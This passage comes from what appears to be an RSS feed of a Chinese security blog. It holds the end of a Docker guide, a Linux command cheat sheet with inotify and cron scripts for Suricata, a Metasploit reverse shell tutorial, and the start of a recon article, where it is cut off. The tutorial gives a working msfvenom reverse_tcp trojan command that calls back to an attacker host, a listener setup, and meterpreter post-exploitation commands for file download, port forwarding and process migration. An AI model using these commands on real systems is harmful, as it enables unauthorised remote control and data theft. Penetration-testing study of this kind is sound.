class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker run -it -m 4G -v /var/log/suricata:/mnt -p 5601:5601 -p 9200:9200 -p 5044:5044 sebp/elk: 638</span><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker ps -a</span>CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                                                              NAMES45a7bc7b174d        sebp/elk:623        <span class="token string">"/usr/local/bin/star…"</span>   13 hours ago        Up 12 hours         0.0.0.0:5044-<span class="token operator">></span>5044/tcp, 0.0.0.0:5601-<span class="token operator">></span>5601/tcp, 0.0.0.0:9200-<span class="token operator">></span>9200/tcp, 9300/tcp   charming_wu<span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker exec -it 45a7bc7b174d bash</span>root@45a7bc7b174d:/<span class="token comment" spellcheck="true"># ls</span>bd_build  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到宿主机文件夹mnt</p><p><img src="/2020/09/28/docker-guide/1603765650364.png" alt="1603765650364"></p><h3 id="挂载两个目录"><a href="#挂载两个目录" class="headerlink" title="挂载两个目录"></a>挂载两个目录</h3><p>注意每个目录前都要加参数-v</p><pre class="line-numbers language-bash"><code class="language-bash">docker run -it -v <span class="token variable">$path_to_host_data</span><span class="token keyword">:</span><span class="token variable">$new_path_in_docker</span> -v <span class="token variable">$path1_to_host_data</span><span class="token keyword">:</span><span class="token variable">$new_path1_in_docker</span> deep_sleepnet:1.0 /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-2-查看docker容器linux版本"><a href="#2-2-查看docker容器linux版本" class="headerlink" title="2.2 查看docker容器linux版本"></a>2.2 查看docker容器linux版本</h2><p>查看 Docker Linux 容器系统对应发行版本。</p><p>使用如下命令查看。</p><pre class="line-numbers language-shell"><code class="language-shell">cat /etc/issue<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而常用的 <code>uname -a</code> 等等命令，则是查看到宿主机的发行版本</p><p><img src="/2020/09/28/docker-guide/1615972275875.png" alt="1615972275875"></p><h2 id="2-3-集合操作"><a href="#2-3-集合操作" class="headerlink" title="2.3 集合操作"></a>2.3 集合操作</h2><h4 id="列出所有的容器-ID"><a href="#列出所有的容器-ID" class="headerlink" title="列出所有的容器 ID"></a>列出所有的容器 ID</h4><pre class="line-numbers language-bash"><code class="language-bash">docker <span class="token function">ps</span> -aq<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="停止所有的容器"><a href="#停止所有的容器" class="headerlink" title="停止所有的容器"></a>停止所有的容器</h4><pre class="line-numbers language-bash"><code class="language-bash">docker stop <span class="token variable"><span class="token variable">$(</span>docker <span class="token function">ps</span> -aq<span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="删除所有的容器"><a href="#删除所有的容器" class="headerlink" title="删除所有的容器"></a>删除所有的容器</h4><pre class="line-numbers language-bash"><code class="language-bash">docker <span class="token function">rm</span> <span class="token variable"><span class="token variable">$(</span>docker <span class="token function">ps</span> -aq<span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="删除所有的镜像"><a href="#删除所有的镜像" class="headerlink" title="删除所有的镜像"></a>删除所有的镜像</h4><pre class="line-numbers language-bash"><code class="language-bash">docker rmi <span class="token variable"><span class="token variable">$(</span>docker images -q<span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="删除所有不使用的镜像"><a href="#删除所有不使用的镜像" class="headerlink" title="删除所有不使用的镜像"></a>删除所有不使用的镜像</h4><pre class="line-numbers language-bash"><code class="language-bash">docker image prune --force --all或者docker image prune -f -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="删除所有停止的容器"><a href="#删除所有停止的容器" class="headerlink" title="删除所有停止的容器"></a>删除所有停止的容器</h4><pre class="line-numbers language-bash"><code class="language-bash">docker container prune -f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="批量删除镜像"><a href="#批量删除镜像" class="headerlink" title="批量删除镜像"></a>批量删除镜像</h4><p>可以删除所有名字中带 “none” 关键字的镜像，即可以把所有编译错误的镜像删除。</p><pre class="line-numbers language-bash"><code class="language-bash">docker rmi <span class="token punctuation">$(</span>docker images <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"none"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&amp;#123;print <span class="token variable">$3</span>&amp;#125;'</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面这条命令，可以删除所有名字中带 “none” 关键字的镜像，即可以把所有编译错误的镜像删除。</p><p>这个 grep 后面的参数，就是筛选出名字中包含这个参数的镜像。</p><h1 id="3-dockerfile"><a href="#3-dockerfile" class="headerlink" title="3 dockerfile"></a>3 dockerfile</h1><p><a href="https://www.runoob.com/docker/docker-dockerfile.html">https://www.runoob.com/docker/docker-dockerfile.html</a></p><h2 id="3-1-dockerfile编写"><a href="#3-1-dockerfile编写" class="headerlink" title="3.1 dockerfile编写"></a>3.1 dockerfile编写</h2><h2 id="3-2-构建镜像"><a href="#3-2-构建镜像" class="headerlink" title="3.2 构建镜像"></a>3.2 构建镜像</h2><p>在 Dockerfile 文件的存放目录下，执行构建动作。</p><p>以下示例，通过目录下的 Dockerfile 构建一个 nginx:v3（镜像名称:镜像标签）。</p><pre class="line-numbers language-bash"><code class="language-bash">docker build -t nginx:v3 <span class="token keyword">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>注</strong>：最后的 <strong>.</strong> 代表本次执行的上下文路径。上下文路径，是指 docker 在构建镜像，有时候想要使用到本机的文件（比如复制），docker build 命令得知这个路径后，会将路径下的所有内容打包。</p><p><strong>解析</strong>：由于 docker 的运行模式是 C/S。我们本机是 C，docker 引擎是 S。实际的构建过程是在 docker 引擎下完成的，所以这个时候无法用到我们本机的文件。这就需要把我们本机的指定目录下的文件一起打包提供给 docker 引擎使用。</p><p>如果未说明最后一个参数，那么默认上下文路径就是 Dockerfile 所在的位置。</p><p><strong>注意</strong>：上下文路径下不要放无用的文件，因为会一起打包发送给 docker 引擎，如果文件过多会造成过程缓慢。</p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E5%AE%B9%E5%99%A8%E6%95%99%E7%A8%8B/">容器教程</category>
      
      
      <comments>https://m01ly.github.io/2020/09/28/docker-guide/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>linux命令大全</title>
      <link>https://m01ly.github.io/2020/09/28/linux-cmd/</link>
      <guid>https://m01ly.github.io/2020/09/28/linux-cmd/</guid>
      <pubDate>Mon, 28 Sep 2020 07:22:20 GMT</pubDate>
      
      <description>&lt;p&gt;linux命令大全，方便自己检索&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>linux命令大全，方便自己检索</p><a id="more"></a><h4 id="重命名："><a href="#重命名：" class="headerlink" title="重命名："></a>重命名：</h4><pre><code>原字符串：将文件名需要替换的字符串；目标字符串：将文件名中含有的原字符替换成目标字符串；文件：指定要改变文件名的文件列表。</code></pre><pre><code>rename main1.c main.c main1.c</code></pre><h4 id="复制文件："><a href="#复制文件：" class="headerlink" title="复制文件："></a>复制文件：</h4><pre><code> cp -i file1 dir1</code></pre><h4 id="linux-查看进程"><a href="#linux-查看进程" class="headerlink" title="linux 查看进程"></a>linux 查看进程</h4><p>ps -ef/  ps -aux </p><p>[root@ids0001 logstash]# ps -ef |grep logstash</p><h4 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h4><p>kill 1827 </p><p>kill -9 1827</p><h4 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h4><pre><code>free -m</code></pre><h4 id="查看进程所用内存"><a href="#查看进程所用内存" class="headerlink" title="查看进程所用内存"></a>查看进程所用内存</h4><pre><code>top然后按M进行排序</code></pre><h4 id="后台运行"><a href="#后台运行" class="headerlink" title="后台运行"></a>后台运行</h4><pre><code>sudo nohup cmd </code></pre><p>sudo nohup /usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/logstash.conf &amp;</p><h4 id="inotify命令"><a href="#inotify命令" class="headerlink" title="inotify命令"></a><a href="https://cloud.tencent.com/developer/article/1417976">inotify命令</a></h4><p>功能：监控某个目录的文件是否发生变化执行相应脚本 </p><p>（0）首先查看系统内核是否支持inotify功能   ls -l /proc/sys/fs/inotify，出现如下内容说明支持：</p><pre class="line-numbers language-bash"><code class="language-bash">total 0-rw-r--r-- 1 root root 0 Apr 23 15:23 max_queued_events-rw-r--r-- 1 root root 0 Apr 24 22:11 max_user_instances-rw-r--r-- 1 root root 0 Apr 23 15:23 max_user_watches<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>或通过 uname -a 查看当前系统内核版本是否在2.6.13 以上：</p><pre class="line-numbers language-bash"><code class="language-bash">Linux VM_3_105_centos 3.10.107 x86_64 GNU/Linux<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（1）查看是否安装</p><pre class="line-numbers language-bash"><code class="language-bash">rpm -qa inotify-tools <span class="token comment" spellcheck="true">#如果没安装</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>没有回显则没有安装</p><p>（2）安装inotify</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-6.repoyum <span class="token function">install</span> inotify-tools -y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/09/28/linux-cmd/1604557978079.png" alt="1604557978079"></p><p>(3) 查看版本</p><p><img src="/2020/09/28/linux-cmd/1604558015626.png" alt="1604558015626"></p><p>(4)使用教程</p><p>1）创建执行脚本：inotifytest.sh脚本：监控/root/testdir目录，输出目录的CRUD变化。<a href="https://blog.csdn.net/zzmfish/article/details/48787355?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param">参考使用inotifywait同步修改的文件到服务器</a>。</p><pre class="line-numbers language-sh"><code class="language-sh">#!/bin/bash#监视目录和目标目录FROM_DIR="/root/testdir"#inotifywait -m -r --timefmt "%F %T" --format "%e %w %f" -o /var/log/change.log $FROM_DIRinotifywait -m --format "%e %w %f" $FROM_DIR | while read eventName dirName fileName; do    #显示事件    echo "-- Event:$eventName Dir:$dirName File:$fileName"    #忽略“.”开头和“_”结束的文件    if [[ $fileName == .* ]] || [[ $fileName == *_ ]]; then        continue    fi    #复制改动的文件（有些IDE会在临时文件编辑，保存时同够移动覆盖原文件）    case $eventName in    CREATE)        echo "create $fileName"        sudo /usr/local/bin/suricata -c /etc/suricata/suricata.yaml -r /tmp/$&#123;$fileName&#125; -l  /var/log/suricata/cap        #cp -v $&#123;dirName&#125;$&#123;fileName&#125; $TO_DIR/$dirName    esacdone<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）执行监听脚本</p><pre><code>./inotifytest.sh#启动监听脚本，观察文件夹内的变化</code></pre><p><img src="/2020/09/28/linux-cmd/1604562579710.png" alt="1604562579710"></p><p>执行下面脚本，在文件夹内新增文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>int<span class="token operator">=</span>1<span class="token keyword">while</span><span class="token variable"><span class="token punctuation">((</span> $int<span class="token operator">&lt;=</span><span class="token number">10</span> <span class="token punctuation">))</span></span>do+    <span class="token keyword">echo</span> <span class="token variable">$int</span>    <span class="token function">cp</span> /tmp/test.cap /root/testdir/$<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;int&amp;#125;.cap</span>    <span class="token keyword">let</span> <span class="token string">"int++"</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="crontab定时"><a href="#crontab定时" class="headerlink" title="crontab定时"></a>crontab定时</h4><p><a href="https://www.cnblogs.com/wenzheshen/p/8432588.html">https://www.cnblogs.com/wenzheshen/p/8432588.html</a></p><p><a href="https://blog.csdn.net/ithomer/article/details/6817019">https://blog.csdn.net/ithomer/article/details/6817019</a></p><p><a href="https://www.jellythink.com/archives/155">https://www.jellythink.com/archives/155</a></p><p>新建脚本time.sh 内容如下，防止suricata执行时间过长，有些文件没有执行到就被删除了</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token function">cp</span> -Rf /root/testdir/ /root/temp/<span class="token function">rm</span> -rf /root/testdir/*suricata -c /etc/suricata/suricata.yaml -r /root/temp/<span class="token function">rm</span> -rf /root/temp/*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在终端输入以下命令：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">crontab</span> -e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在显示的文件末尾添加以下规则：#每5分钟运行一次time.sh脚本,并把错误和正确的日志都存到/tmp/load.log上。</p><pre class="line-numbers language-bash"><code class="language-bash">*/5 * * * * /root/time.sh <span class="token operator">></span> /tmp/load.log 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑完成，保存完成以后，就会显示以下提示信息：</p><pre class="line-numbers language-bash"><code class="language-bash">crontab: installing new <span class="token function">crontab</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这就说明正在安装新的定时任务，如果没有这条提示信息，请重新运行<code>crontab -e</code>命令。</p><p><img src="/2020/09/28/linux-cmd/1604578836302.png" alt="1604578836302"></p><p>每一分钟请求一个地址</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">crontab</span> -e*/1 * * * *  /usr/bin/curl https://www.baidu.com/ <span class="token operator">></span> /tmp/load.log 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2.将正确和错误日志都输出到 /tmp/load.log</p><pre class="line-numbers language-bash"><code class="language-bash">*/1 * * * * /root/XXXX.sh <span class="token operator">></span> /tmp/load.log 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后推荐个在线网站 解读表达式<a href="https://tool.lu/crontab">https://tool.lu/crontab</a></p><p><img src="/2020/09/28/linux-cmd/1617957777906.png" alt="1617957777906"></p><h4 id="删除rm"><a href="#删除rm" class="headerlink" title="删除rm"></a>删除rm</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cp</span> -Rf /home/user1/* /root/temp/将 /home/user1目录下的所有东西拷到/root/temp/下而不拷贝user1目录本身。即格式为：cp -Rf 原路径/ 目的路径/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content:encoded>
      
      
      
      
      <comments>https://m01ly.github.io/2020/09/28/linux-cmd/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>在阿里云主机反弹metosploit</title>
      <link>https://m01ly.github.io/2020/09/28/pt-metosploitInAliyun/</link>
      <guid>https://m01ly.github.io/2020/09/28/pt-metosploitInAliyun/</guid>
      <pubDate>Mon, 28 Sep 2020 07:22:20 GMT</pubDate>
      
      <description>&lt;h2 id=&quot;前提&quot;&gt;&lt;a href=&quot;#前提&quot; class=&quot;headerlink&quot; title=&quot;前提&quot;&gt;&lt;/a&gt;前提&lt;/h2&gt;&lt;p&gt;一般反弹shell，需要一个公网Ip的机器，这里我们选择阿里云主机，因为阿里云主机默认是只开放了固定端口，因此我们想要对某个端口监听的，首先需要开起阿里云的具体端口，这里我们选择7777作为监听端口，具体配置如下图所示。这里还应该注意的是阿里云主机有两个IP，一个是公网IP，另外一个是内网IP，具体用法下面会说到。&lt;/p&gt;
&lt;p&gt;利用阿里云作为反弹主机，因为阿里云主机默认是将端口关闭的，因此首先需要允许对应端口开放，这里我选择的是7777，具体配置如下图所示。需要注意的是，阿里主机有两个IP，一个为公网IP，一个为内网IP，这两个IP后面会说到。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>一般反弹shell，需要一个公网Ip的机器，这里我们选择阿里云主机，因为阿里云主机默认是只开放了固定端口，因此我们想要对某个端口监听的，首先需要开起阿里云的具体端口，这里我们选择7777作为监听端口，具体配置如下图所示。这里还应该注意的是阿里云主机有两个IP，一个是公网IP，另外一个是内网IP，具体用法下面会说到。</p><p>利用阿里云作为反弹主机，因为阿里云主机默认是将端口关闭的，因此首先需要允许对应端口开放，这里我选择的是7777，具体配置如下图所示。需要注意的是，阿里主机有两个IP，一个为公网IP，一个为内网IP，这两个IP后面会说到。<a id="more"></a></p><p><img src="/2020/09/28/pt-metosploitInAliyun/1602814914926.png" alt="1602814914926"></p><h2 id="反弹shell步骤"><a href="#反弹shell步骤" class="headerlink" title="反弹shell步骤"></a>反弹shell步骤</h2><p>步骤如下：</p><p>1）生成载荷/木马，注意这里用的是阿里云公网IP（<a href="https://www.cnblogs.com/LyShark/p/12189163.html">生成各种载荷</a>）</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=阿里云公网IP lport=7777 -f exe &gt; load.exe</code></pre><p>2） 阿里云主机开始监听</p><pre><code>msfconsle #打开msfuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcp #注意这里的载荷要和生成木马对应的载荷相同options #查看选项set LHOST 阿里云内网IP #设置监听IPset LPORT 7777  #设置监听端口run/exploit#开始监听</code></pre><p>3)目标主机执行载荷/木马</p><p>双击Exe，如果是linux下，生成的elf木马</p><pre><code>chmod muma.elf#赋可执行权限./muma.elf #执行木马</code></pre><p>4）观察阿里云主机是否连接成功，如下图表示连接成功</p><p><img src="/2020/09/28/pt-metosploitInAliyun/1610957093533.png" alt="1610958466075"></p><p>5）连接成功后，meterpreter常用命令如下。</p><p><strong>基本命令</strong></p><pre class="line-numbers language-bash"><code class="language-bash">background  <span class="token comment" spellcheck="true"># 让meterpreter处于后台模式  </span>sessions -i index   <span class="token comment" spellcheck="true"># 与会话进行交互，index表示第一个session  </span>quit  <span class="token comment" spellcheck="true"># 退出会话  </span>shell <span class="token comment" spellcheck="true"># 获得控制台权限  </span>irb <span class="token comment" spellcheck="true"># 开启ruby终端</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>文件系统命令</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> <span class="token comment" spellcheck="true"># 查看文件内容  </span>getwd <span class="token comment" spellcheck="true"># 查看当前工作目录  </span>upload  <span class="token comment" spellcheck="true"># 上传文件到目标机上  </span>download <span class="token comment" spellcheck="true"># 下载文件到本机上  </span>edit <span class="token comment" spellcheck="true"># 编辑文件  </span>search  <span class="token comment" spellcheck="true"># 搜索文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>网络命令</strong></p><pre class="line-numbers language-bash"><code class="language-bash">ipconfig / <span class="token function">ifconfig</span> <span class="token comment" spellcheck="true"># 查看网络接口信息  </span>portfwd  add -l 4444 -p 3389 -r 192.168.1.102 <span class="token comment" spellcheck="true"># 端口转发，本机监听4444，把目标机3389转到本机4444 </span>rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 <span class="token comment" spellcheck="true">#然后使用rdesktop来连接，-u 用户名 -p 密码</span>route <span class="token comment" spellcheck="true"># 获取路由表信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>系统命令</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> <span class="token comment" spellcheck="true"># 查看当前活跃进程 </span>migrate pid <span class="token comment" spellcheck="true"># 将Meterpreter会话移植到进程数位pid的进程中 </span>execute -H -i -f cmd.exe <span class="token comment" spellcheck="true"># 创建新进程cmd.exe，-H不可见，-i交互 </span>getpid <span class="token comment" spellcheck="true"># 获取当前进程的pid </span><span class="token function">kill</span> pid <span class="token comment" spellcheck="true"># 杀死进程 </span>getuid <span class="token comment" spellcheck="true"># 查看权限 </span>sysinfo <span class="token comment" spellcheck="true"># 查看目标机系统信息，如机器名，操作系统等 </span><span class="token function">shutdown</span> <span class="token comment" spellcheck="true"># 关机</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="REF："><a href="#REF：" class="headerlink" title="REF："></a>REF：</h2><p><a href="https://paper.seebug.org/29/">meterpreter相关教程包括后渗透攻击</a></p><p><a href="https://www.cnblogs.com/LyShark/p/12189163.html">Metasploit 生成各种攻击载荷</a></p><p><a href="https://lipeilipei.top/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/">各种姿势反弹shell</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</category>
      
      
      <comments>https://m01ly.github.io/2020/09/28/pt-metosploitInAliyun/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>信息收集</title>
      <link>https://m01ly.github.io/2020/09/28/pt-info-collection/</link>
      <guid>https://m01ly.github.io/2020/09/28/pt-info-collection/</guid>
      <pubDate>Mon, 28 Sep 2020 03:14:51 GMT</pubDate>
      
      <description>&lt;p&gt;江湖上流传着这样一句话，渗透测试的本质就是信息收集，一次成功的渗入，百分之80的时间都花在了信息收集上，信息收集真的这么重要么？那么具体要收集什么信息呢？&lt;/p&gt;
&lt;p&gt;信息收集主要是收集服务器的配置信息和网站的敏感信息，主要包括域名信息、子域名信息、目标网站信息、目标网站真实IP、目录文件、开放端口和服务、中间件信息、脚本语言等等等。 &lt;strong&gt;汇总图如下？？？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在进行信息收集的时候，我们既要全面详细的获取目标的信息，又要尽量隐藏自己不被发现。尽量用网络搜集，用工具收集时适当挂代理&lt;/strong&gt;。因此主要从网络搜集和工具搜集两种方式去逐个介绍。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>江湖上流传着这样一句话，渗透测试的本质就是信息收集，一次成功的渗入，百分之80的时间都花在了信息收集上，信息收集真的这么重要么？那么具体要收集什么信息呢？</p><p>信息收集主要是收集服务器的配置信息和网站的敏感信息，主要包括域名信息、子域名信息、目标网站信息、目标网站真实IP、目录文件、开放端口和服务、中间件信息、脚本语言等等等。 <strong>汇总图如下？？？</strong></p><p><strong>在进行信息收集的时候，我们既要全面详细的获取目标的信息，又要尽量隐藏自己不被发现。尽量用网络搜集，用工具收集时适当挂代理</strong>。因此主要从网络搜集和工具搜集两种方式去逐个介绍。</p><a id="more"></a><h1 id="1-域名信息"><a href="#1-域名信息" class="headerlink" title="1 域名信息"></a>1 域名信息</h1><p>域名信息：whois信息，备案信息</p><h2 id="1-1-whois信息"><a href="#1-1-whois信息" class="headerlink" title="1.1 whois信息"></a>1.1 whois信息</h2><p>关注的重点是注册商、注册人、邮件、DNS解析服务器、注册人联系电话。 </p><p>Kali的查询：whois -h 注册服务器地址  域名  .例如：whoid freebuf.com</p><p> 站长工具-站长之家域名WHOIS信息查询地址：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p><p>爱站网域名WHOIS信息查询地址：<a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></p><p>腾讯云域名WHOIS信息查询地址：<a href="https://whois.cloud.tencent.com/">https://whois.cloud.tencent.com/</a></p><p>国外的who.is：<a href="https://who.is/">https://who.is/</a> </p><p>微步：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> </p><p>Virus Total:<a href="https://www.virustotal.com/">https://www.virustotal.com</a></p><p><img src="/2020/09/28/pt-info-collection/1599205057130.png" alt="1599205057130"></p><h2 id="1-2-备案信息"><a href="#1-2-备案信息" class="headerlink" title="1.2 备案信息"></a>1.2 备案信息</h2><p>备案查询我们主要关注的是：单位信息例如名称、备案编号、网站负责人、法人、电子邮箱、联系电话等。 </p><p>常见查询备案信息的网站如下：</p><p>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a> </p><p>ICP备案查询网：<a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a> </p><p>国家企业信用信息公示系统：<a href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a> </p><p>爱站的备案查询：<a href="https://icp.aizhan.com/">https://icp.aizhan.com</a></p><p><img src="/2020/09/28/pt-info-collection/1599205081019.png" alt="1599205081019"></p><h1 id="2-子域名收集"><a href="#2-子域名收集" class="headerlink" title="2 子域名收集"></a>2 子域名收集</h1><p>子域名也就是二级域名，是指顶级域名下的域名。收集的子域名越多，我们测试的目标就越多，目标系统渗透成功的机率也越大。主站无懈可击的时候子域名是一个很好的突破口。</p><h2 id="2-1-网络搜索"><a href="#2-1-网络搜索" class="headerlink" title="2.1  网络搜索"></a>2.1  网络搜索</h2><h2 id="2-1-1-搜索引擎"><a href="#2-1-1-搜索引擎" class="headerlink" title="2.1.1 搜索引擎"></a>2.1.1 搜索引擎</h2><p> 可以利用Google、Bing 、shodan和百度这样的搜索引擎进行搜索查询 ，要掌握黑客语法，具体如下：</p><p>Google搜索语法：<a href="https://www.dazhuanlan.com/2019/08/15/5d55112f06e84/">https://www.dazhuanlan.com/2019/08/15/5d55112f06e84/</a></p><p>Bing搜索语法：<a href="https://blog.csdn.net/hansel/article/details/53886828">https://blog.csdn.net/hansel/article/details/53886828</a></p><p>百度搜索语法：<a href="https://www.cnblogs.com/k0xx/p/12794452.html">https://www.cnblogs.com/k0xx/p/12794452.html</a></p><p>搜索实例：</p><p><img src="/2020/09/28/pt-info-collection/1599205666073.png" alt="1599205666073"></p><h2 id="2-1-2-在线网站"><a href="#2-1-2-在线网站" class="headerlink" title="2.1.2 在线网站"></a>2.1.2 在线网站</h2><p>（1）<a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></p><p>（2）<a href="http://i.links.cn/subdomain/%EF%BC%88">http://i.links.cn/subdomain/（</a></p><p>（3）<a href="http://dns.aizhan.com/">http://dns.aizhan.com</a></p><p>（4）<a href="http://z.zcjun.com/%EF%BC%88%E5%93%8D%E5%BA%94%E5%BE%88%E5%BF%AB,%E6%8E%A8%E8%8D%90%EF%BC%89">http://z.zcjun.com/（响应很快,推荐）</a></p><p>（5）Github搜索子域名</p><p><img src="/2020/09/28/pt-info-collection/1599206150013.png" alt="1599206150013"></p><h2 id="2-2-工具搜集"><a href="#2-2-工具搜集" class="headerlink" title="2.2 工具搜集"></a>2.2 工具搜集</h2><p>检测工具有很多，但重要的是需要日常完善字典，字典强大才是硬道理。常见的有</p><p>layer子域名挖掘机、Sublist3r、subDomainsBrute、K8、orangescan、DNSRecon、dnsmaper、wydomain等等，重点推荐layer子域名挖掘机（使用简单，界面细致）、Sublist3r（列举多资源下查到的域名）和subDomainsBrute。（递归查询多级域名），此类工具github都有下载地址和使用方法。</p><p>链接如下：</p><p>SubDomainBrute：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p><p>Sublist3r：<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></p><p>Layer（5.0增强版）：<a href="https://pan.baidu.com/s/1Jja4QK5BsAXJ0i0Ax8Ve2Q">https://pan.baidu.com/s/1Jja4QK5BsAXJ0i0Ax8Ve2Q</a> 密码:aup5</p><p><a href="https://d.chinacycc.com/">https://d.chinacycc.com</a>（大佬推荐的说好用的很，但是收费。）</p><h1 id="3-真实IP收集"><a href="#3-真实IP收集" class="headerlink" title="3 真实IP收集"></a>3 真实IP收集</h1><p>信息收集工程中IP地址是必不可少的，在域名收集工程中我们已经对ip段收集，whois、ping测试、指纹网站都可以探测ip地址，但是很多目标服务器存在CDN，那什么是CDN，如果饶过查找真实IP呢？</p><p>CDN的全称是Content Delivery Network，即<a href="https://baike.baidu.com/item/%E5%86%85%E5%AE%B9%E5%88%86%E5%8F%91%E7%BD%91%E7%BB%9C/4034265">内容分发网络</a>。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，只有在实际数据交互时才会从远程web服务器响应，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p><h2 